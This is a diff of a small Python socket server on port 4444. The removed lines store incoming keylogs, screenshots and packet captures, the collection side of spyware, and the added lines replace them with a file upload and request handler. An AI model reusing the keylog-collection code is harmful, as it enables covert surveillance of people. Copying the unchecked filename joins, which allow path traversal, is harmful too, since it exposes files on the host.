@@ -1,12 +1,9 @@
 import socket
 import os
-import time
 
-KEYLOG_DIR = r"C:\Users\<User>\Downloads"
-SCREENSHOT_DIR = r"C:\Users\<User>\Downloads"
-PACKETS_DIR = r"C:\Users\<User>\Downloads"
 HOST = "127.0.0.1"
 PORT = 4444
+BASE_DIR = r"C:\Users\<User>\Desktop"
 
 def start_listener():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
@@ -17,53 +14,51 @@ def start_listener():
             handle_client(client)
 
 def handle_client(client):
-    try:
-        data = b""
-        while True:
-            chunk = client.recv(4096)
-            if not chunk:
-                break
-            data += chunk
-        process_data(data)
-    except:
-        pass
-    finally:
-        client.close()
+    data = b""
+    while True:
+        chunk = client.recv(4096)
+        if not chunk:
+            break
+        data += chunk
+    process_data(data, client)
+    client.close()
 
-def process_data(data):
+def process_data(data, client):
     lines = data.split(b"\n", 1)
     if len(lines) < 2:
+        handle_requests(data, client)
         return
     header = lines[0].strip()
     payload = lines[1]
-    if header.startswith(b"[keylog]"):
-        save_keylog(payload)
-    elif header.startswith(b"[screenshot]"):
-        save_screenshot(header, payload)
-    elif header.startswith(b"[packets]"):
-        save_packets(payload)
+    if header.startswith(b"[upload]"):
+        filename = header.split(b"]")[1].strip().decode()
+        path = os.path.join(BASE_DIR, filename)
+        if b".txt" in header or b".png" in header:
+            store_file(path, payload)
+    else:
+        handle_requests(data, client)
 
-def save_keylog(payload):
-    stamp = time.strftime("%Y-%m-%d")
-    os.makedirs(KEYLOG_DIR, exist_ok=True)
-    path = os.path.join(KEYLOG_DIR, f"{stamp}_keylog.txt")
-    with open(path, "ab") as f:
-        f.write(payload)
+def handle_requests(data, client):
+    if data.startswith(b"[request]"):
+        filename = data.split(b"]")[1].strip().decode()
+        path = os.path.join(BASE_DIR, filename)
+        if os.path.exists(path):
+            try:
+                with open(path, "rb") as f:
+                    file_data = f.read()
+                client.sendall(file_data)
+            except:
+                client.sendall(b"[nofile]")
+        else:
+            client.sendall(b"[nofile]")
+    else:
+        pass
 
-def save_screenshot(header, payload):
-    stamp = header.split(b"]")[1]
-    stamp = stamp.strip()
-    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
-    shot_name = f"screenshot_{stamp.decode()}.png"
-    path = os.path.join(SCREENSHOT_DIR, shot_name)
-    with open(path, "wb") as f:
-        f.write(payload)
-
-def save_packets(payload):
-    stamp = time.strftime("%Y-%m-%d")
-    os.makedirs(PACKETS_DIR, exist_ok=True)
-    path = os.path.join(PACKETS_DIR, f"{stamp}_packets.txt")
-    with open(path, "ab") as f:
+def store_file(path, payload):
+    folder = os.path.dirname(path)
+    os.makedirs(folder, exist_ok=True)
+    mode = "ab" if os.path.exists(path) else "wb"
+    with open(path, mode) as f:
         f.write(payload)
 
 if __name__ == "__main__":
